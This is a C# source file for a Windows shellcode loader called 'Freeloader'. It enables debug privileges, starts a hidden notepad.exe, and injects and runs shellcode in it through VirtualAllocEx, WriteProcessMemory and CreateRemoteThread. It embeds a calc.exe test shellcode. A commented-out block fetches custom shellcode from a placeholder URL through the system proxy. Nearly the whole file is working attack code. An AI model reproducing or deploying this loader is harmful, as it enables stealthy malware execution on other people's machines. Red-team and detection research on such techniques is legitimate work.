using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static Freeloader.Free32;

namespace Freeloader
{
    internal class Program
    {

        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint TOKEN_QUERY = 0x0008;
        const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        public static bool EnableDebugPrivileges()
        {
            IntPtr hToken;
            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
                return false;

            LUID luid;
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
                return false;

            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Luid = luid;
            tp.Attributes = SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                return false;

            return Marshal.GetLastWin32Error() == 0;
        }
        public static void Main(string[] args)
        {

            EnableDebugPrivileges();
            //byte[] shellcode; <- Enable if using custom shellcode 
            int bytesWritten = 0;
            int lpthreadID = 0;

            /*using (var client = new WebClient())
            {
                // enable proxy
                client.Proxy = WebRequest.GetSystemWebProxy();
                client.UseDefaultCredentials = true;

                // set tls version relevant to proxy
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

                // change me
                shellcode = client.DownloadData("https://(URL)/(RAW SHELLCODE)"); <- Adjust for your hosted shellcode
            };*/

            // test shellcode for calc.exe

            byte[] shellcode = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00};

            Console.WriteLine($"Shellcode Length: {shellcode.Length}");

            var startup = new STARTUPINFO { dwFlags = 0x00000001 };
            startup.cb = Marshal.SizeOf(startup);

            var success = CreateProcessW(
                null,
                "C:\\Windows\\System32\\notepad.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATION_FLAGS.CREATE_NO_WINDOW,
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref startup,
                out var processInfo);

            IntPtr procHandle = Free32.OpenProcess(
                (uint)(Free32.PROCESS_ACCESS.PROCESS_ALL_ACCESS),
                false,
                processInfo.dwProcessId
                );

            if (procHandle == IntPtr.Zero)
            {
                int errorCode = Marshal.GetLastWin32Error();
                Console.WriteLine($"Failed to open process handle. Error code: {errorCode}");
                return;
            }

            Console.WriteLine($"Opened process handle: {procHandle}");

            IntPtr init = Free32.VirtualAllocEx(
                procHandle,
                IntPtr.Zero,
                (uint)shellcode.Length,
                Free32.ALLOCATION_TYPE.MEM_COMMIT | Free32.ALLOCATION_TYPE.MEM_RESERVE,
                Free32.PROTECTION_FLAGS.PAGE_READWRITE
                );

            Console.WriteLine($"Allocated memory at: 0x{((ulong)init).ToString("X")}");
            Console.WriteLine($"ProcHandle: {procHandle}, Address: {init}, ShellcodeLength: {shellcode.Length}");

            bool write_success = Free32.WriteProcessMemory(
                procHandle,
                init,
                shellcode,
                shellcode.Length,
                ref bytesWritten
                );

            success = VirtualProtectEx(
                processInfo.hProcess,
                init,
                (uint)shellcode.Length,
                PROTECTION_FLAGS.PAGE_EXECUTE_READ,
                out _);

            Console.WriteLine("[*] Bytes Written: {0}", bytesWritten);

            IntPtr threadPtr = Free32.CreateRemoteThread(
                procHandle,
                IntPtr.Zero,
                0,
                init,
                IntPtr.Zero,
                0,
                ref lpthreadID
                );

            Console.WriteLine("[*] Thread ID: {0}", lpthreadID);
        }
    }
}
